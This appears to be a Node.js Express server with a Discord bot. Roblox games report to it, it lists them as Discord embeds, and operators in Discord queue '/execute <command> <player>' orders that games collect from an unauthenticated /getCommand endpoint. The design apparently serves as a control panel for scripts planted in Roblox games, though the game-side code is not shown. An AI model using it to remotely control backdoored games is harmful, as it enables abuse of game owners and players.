const express = require("express");
const { Client, GatewayIntentBits } = require("discord.js");
const fs = require("fs");
const axios = require("axios");

const app = express();
app.use(express.json());

const TOKEN = process.env.TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;

const FILE = "./games.json";

// ================= TRACKER STORAGE =================
function loadGames() {
    if (fs.existsSync(FILE)) return JSON.parse(fs.readFileSync(FILE));
    return {};
}

function saveGames(data) {
    fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
}

// ================= STATE =================
const creating = {};
const nameCache = {};
let lastCommand = null;

// ================= DISCORD BOT =================
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

let ready = false;

client.once("ready", () => {
    ready = true;
    console.log("✅ Bot ready:", client.user.tag);
});

if (TOKEN) {
    client.login(TOKEN);
}

// ================= ROBLOX NAME =================
async function getGameName(placeId) {
    try {
        if (nameCache[placeId]) return nameCache[placeId];

        const uni = await axios.get(
            `https://apis.roblox.com/universes/v1/places/${placeId}/universe`
        );

        const universeId = uni.data?.universeId;
        if (!universeId) return "Unknown Game";

        const game = await axios.get(
            `https://games.roblox.com/v1/games?universeIds=${universeId}`
        );

        const name = game.data?.data?.[0]?.name || "Unknown Game";
        nameCache[placeId] = name;

        return name;
    } catch {
        return "Unknown Game";
    }
}

// ================= ROBLOX ICON =================
async function getGameIcon(placeId) {
    try {
        const res = await axios.get(
            `https://thumbnails.roblox.com/v1/places/gameicons?placeIds=${placeId}&size=512x512&format=Png`
        );
        return res.data?.data?.[0]?.imageUrl || null;
    } catch {
        return null;
    }
}

// ================= TRACKER =================
app.post("/report", async (req, res) => {
    try {
        if (!ready) return res.json({ ok: false });

        const { placeId, players } = req.body;
        if (!placeId) return res.json({ ok: false });

        let games = loadGames();
        const channel = await client.channels.fetch(CHANNEL_ID);

        const gameUrl = `https://www.roblox.com/games/${placeId}`;
        const gameName = await getGameName(placeId);
        const icon = await getGameIcon(placeId);

        let existing = games[placeId];
        let msg = null;

        if (existing?.messageId) {
            try {
                msg = await channel.messages.fetch(existing.messageId);
            } catch {}
        }

        // CREATE
        if (!msg) {
            if (creating[placeId]) return res.json({ ok: true });

            creating[placeId] = true;

            const newMsg = await channel.send({
                embeds: [{
                    title: gameName,
                    color: 0x8a2be2,
                    thumbnail: icon ? { url: icon } : null,
                    fields: [
                        { name: "👥 Players", value: String(players), inline: true },
                        { name: "🆔 PlaceId", value: String(placeId), inline: true },
                        { name: "🔗 Join", value: gameUrl }
                    ]
                }]
            });

            games[placeId] = { messageId: newMsg.id };
            saveGames(games);

            creating[placeId] = false;
            return res.json({ ok: true });
        }

        // UPDATE
        await msg.edit({
            embeds: [{
                title: gameName,
                color: 0x8a2be2,
                thumbnail: icon ? { url: icon } : null,
                fields: [
                    { name: "👥 Players", value: String(players), inline: true },
                    { name: "🆔 PlaceId", value: String(placeId), inline: true },
                    { name: "🔗 Join", value: gameUrl }
                ]
            }]
        });

        res.json({ ok: true });

    } catch (e) {
        console.log(e);
        res.json({ ok: false });
    }
});


// =====================================================
// 💜 COMMAND SYSTEM (DISCORD /execute)
// =====================================================
client.on("messageCreate", async (msg) => {
    if (!ready) return;
    if (msg.author.bot) return;
    if (msg.channel.id !== CHANNEL_ID) return;

    // /execute Organator RavoxRBLX
    if (msg.content.startsWith("/execute")) {

        const args = msg.content.split(" ");

        const action = args[1];
        const player = args[2];

        if (!action || !player) {
            return msg.reply("Usage: /execute <command> <player>");
        }

        lastCommand = {
            action: action.toLowerCase(),
            player,
            time: Date.now()
        };

        msg.reply(`✅ Queued: ${action} → ${player}`);
    }
});


// =====================================================
// 🎮 ROBLOX FETCH COMMAND
// =====================================================
app.get("/getCommand", (req, res) => {
    if (!lastCommand) return res.json(null);

    const cmd = lastCommand;
    lastCommand = null;

    res.json(cmd);
});


// =====================================================
app.get("/", (req, res) => {
    res.send("Roblox Tracker Running");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log("🚀 Server running");
});
